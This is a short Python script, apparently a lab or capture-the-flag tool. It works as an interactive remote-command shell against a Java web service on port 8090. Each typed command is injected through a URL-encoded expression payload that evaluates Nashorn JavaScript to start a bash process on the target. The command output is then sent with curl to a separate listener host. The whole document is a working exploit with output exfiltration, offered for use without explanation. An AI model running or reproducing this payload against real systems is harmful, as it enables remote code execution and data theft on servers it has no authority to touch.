```python
import os
import urllib.parse 

def interactive_shell():
    while True:
        command = input("> ")
        if command == "exit":
            break
        try:
            command=f"({command}) &> /tmp/qweqwe| curl http://192.168.45.222/ --data @/tmp/qweqwe"
            command=urllib.parse.quote(command)
            print(command)
            input_command=f"curl http://192.168.222.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27{command}%27%29.start%28%29%22%29%7D/"
            print(input_command)
            os.system(input_command)
        
            
            
            
        except OSError:
            print(OSError)
            print("ERROR")
if __name__ == "__main__":
    interactive_shell()
```